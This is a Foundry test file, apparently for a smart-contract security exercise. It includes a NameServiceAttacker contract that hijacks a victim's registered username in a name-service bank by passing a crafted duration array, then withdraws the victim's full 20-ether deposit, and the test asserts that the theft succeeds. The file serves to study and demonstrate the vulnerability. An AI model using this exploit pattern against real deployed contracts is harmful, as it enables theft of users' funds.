// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/OldTest.sol";
import {NAME_SERVICE_BANK} from "../src/NameServiceBank.sol";

pragma solidity ^0.7.0;

contract NameServiceBankTest is Test {
    NAME_SERVICE_BANK nameServiceBank;
    NameServiceAttacker nameServiceAttacker;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    uint256 public nonceOfAttacker;

    function setUp() public {
        nonceOfAttacker = vm.getNonce(attacker);
        vm.deal(victim, 100 ether);
        vm.startPrank(victim);
        nameServiceBank = new NAME_SERVICE_BANK();
        nameServiceBank.setUsername{value: 1 ether}("samczsun", 2, [block.timestamp + 120, block.timestamp]);
        nameServiceBank.deposit{value: 20 ether}();
        vm.stopPrank();
        hoax(attacker, 100 ether);
        nameServiceAttacker = new NameServiceAttacker(address(nameServiceBank), victim);
    }

    function testNameServiceBank() public {
        uint256 attackerBalanceOfBefore = address(nameServiceAttacker).balance;
        uint256 bankBalanceOfBefore = address(nameServiceBank).balance;

        vm.startPrank(attacker);
        nameServiceAttacker.attack{value: 1 ether}();

        uint256 bankBalanceOfAfter = address(nameServiceBank).balance;
        uint256 attackerBalanceOfAfter = address(nameServiceAttacker).balance;
        assertEq(bankBalanceOfBefore - bankBalanceOfAfter, 20 ether);
        assertEq(attackerBalanceOfAfter - attackerBalanceOfBefore, 20 ether);
        assert(vm.getNonce(attacker) < nonceOfAttacker + 3);
    }
}

contract NameServiceAttacker {
    NAME_SERVICE_BANK public nameServiceBank;
    address public victim;

    constructor(address _nameServiceBank, address _victim) {
        nameServiceBank = NAME_SERVICE_BANK(payable(_nameServiceBank));
        victim = _victim;
    }

    function attack() public payable {
        uint256[2] memory duration;
        duration[0] = block.timestamp + 100;
        duration[1] = block.timestamp;

        nameServiceBank.setUsername{value: 1 ether}("samczsun", 2, duration);

        nameServiceBank.withdraw(nameServiceBank.balanceOf(victim));
    }

    receive() external payable {}
}
